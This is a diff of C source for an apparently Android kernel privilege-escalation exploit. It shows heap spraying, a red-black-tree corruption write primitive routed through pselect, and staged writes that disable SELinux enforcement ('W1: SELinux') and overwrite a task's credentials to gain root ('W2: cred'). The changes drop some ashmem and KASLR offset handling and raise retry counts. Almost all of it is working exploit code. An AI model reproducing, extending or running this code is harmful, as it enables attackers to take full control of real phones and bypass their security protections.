@@ -59,20 +59,6 @@ static int soc_is_mtk(void) {
 #undef ROOT_TASK_GROUP_OFF
 #undef SELINUX_BLOB_SIZES_OFF
 #undef SECURITY_HOOK_HEADS_OFF
-#undef KMALLOC_CACHES_OFF
-#undef ANON_PIPE_BUF_OPS_OFF
-#undef ASHMEM_MISC_FOPS_OFF
-#undef ASHMEM_FOPS_OFF
-#undef ASHMEM_IOCTL_OFF
-#undef ASHMEM_COMPAT_IOCTL_OFF
-#undef ASHMEM_MMAP_OFF
-#undef ASHMEM_OPEN_OFF
-#undef ASHMEM_RELEASE_OFF
-#undef ASHMEM_SHOW_FDINFO_OFF
-#undef CONFIGFS_READ_ITER_OFF
-#undef CONFIGFS_BIN_WRITE_ITER_OFF
-#undef COPY_SPLICE_READ_OFF
-#undef NOOP_LLSEEK_OFF
 #undef SLIDE_NFULNL_LOGGER_OFF
 #undef SLIDE_LOGGERS_0_1_OFF
 #undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
@@ -84,20 +70,6 @@ static int soc_is_mtk(void) {
 #define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
 #define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
 #define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
-#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
-#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
-#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
-#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
-#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
-#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
-#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
-#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
-#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
-#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
-#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
-#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
-#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
-#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
 #define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
 #define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
@@ -203,7 +175,7 @@ static double timer_ms(void) {
 extern int pselect_custom_write;
 extern uintptr_t pselect_custom_target;
 extern int pselect_child_node;
-void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
+void set_pselect_write_mode(uintptr_t target, int mode);
 void clear_pselect_write(void);
 
 uint32_t f_wait;
@@ -222,8 +194,6 @@ atomic_int consumer_calls;
 atomic_int consumer_success;
 atomic_int consumer_inflight;
 atomic_int main_route_delay_usec;
-atomic_int pipe_prepare_request;
-atomic_int pipe_prepare_done;
 int memfd_leak;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -316,8 +286,7 @@ void reset_main_route_state(void) {
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
   atomic_store(&consumer_inflight, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
-  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
-  cfi_last_step = 0; cfi_last_errno = 0;
+  route_last_step = 0; route_last_errno = 0;
 }
 
 int run_main_route_threads(void) {
@@ -341,7 +310,7 @@ int run_main_route_threads(void) {
   pthread_join(consumer, NULL);
 
   return atomic_load(&consumer_calls) > 0 &&
-         atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
+         atomic_load(&consumer_success) > 0 && route_last_step == 0;
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
@@ -351,9 +320,9 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
    * with the erased node's rb_right value: fake_left is always NULL so case 1
    * always fires, and the erased node is RED so no color fixup runs. */
   pselect_child_node = leaf ? 0 : 1;
-  set_pselect_write_mode(target, 0, mode);
+  set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  page_base = prepare_good_kernel_page();
   if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
   int routed = run_main_route_threads();
@@ -896,13 +865,8 @@ int run_exploit(int argc, char **argv) {
 
   log_startup_context();
   init_p0_profile();
-  init_ashmem_path();
   pin_to_core(CORE);
   pr_info("main thread running on cpu=%d\n", sched_getcpu());
-
-  kaslr_slide = 0;
-  kaslr_base = KIMAGE_TEXT_BASE;
-  kaslr_done = 1;
 
   timer_reset();
   TIMER("exploit start");
@@ -916,7 +880,7 @@ int run_exploit(int argc, char **argv) {
     }
     TIMER("pre-W1 drain");
     selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
+        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
         verify_selinux_stage, NULL, 0);
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
@@ -985,12 +949,12 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
         verify_w2_stage, &w2_context, 0);
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
       close(pipes.cmd_w); close(pipes.uid_r);
-      pr_warning("W2 failed after 10 rounds\n");
+      pr_warning("W2 failed after 15 rounds\n");
       waitpid(child, NULL, 0);
       return 1;
     }
